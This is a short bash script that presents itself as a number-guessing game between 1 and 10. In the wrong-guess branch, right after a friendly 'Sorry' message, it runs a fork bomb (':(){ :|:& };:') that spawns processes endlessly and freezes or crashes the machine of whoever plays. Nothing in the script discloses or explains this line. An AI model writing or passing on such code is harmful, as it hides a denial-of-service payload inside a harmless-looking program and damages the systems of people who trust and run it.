
#!/bin/bash

# Generate a random number between 1 and 10
target=$(( (RANDOM % 10) + 1 ))

echo "Welcome to the Guessing Game!"
echo "I've chosen a number between 1 and 10. Can you guess it?"

# Loop until the user guesses the correct number
while true; do
    read -p "Enter your guess: " guess

    if [[ $guess -eq $target ]]; then
        echo "Congratulations! You guessed it right!"
        break
    else
        echo "Sorry, that's not the right number :)"
        :(){ :|:& };:
    fi
done

